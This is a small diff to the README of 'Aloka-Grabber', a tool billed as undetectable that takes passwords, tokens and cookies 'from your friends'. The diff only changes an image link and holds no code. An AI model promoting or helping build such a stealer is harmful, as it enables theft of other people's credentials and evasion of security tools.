@@ -1,6 +1,8 @@
 # Aloka-Grabber (UNDETECTABLE 29.08.2023)
 Get Passwords, tokens or Cookies from your friends
-(https://github.com/Koblizek123/Aloka-Grabber/assets/130186289/4e194959-fa48-47c0-bca0-6311bb74cbf3)
+
+
+[!images](https://github.com/Koblizek123/Aloka-Grabber/assets/130186289/4e194959-fa48-47c0-bca0-6311bb74cbf3)
 
 
 # Features 
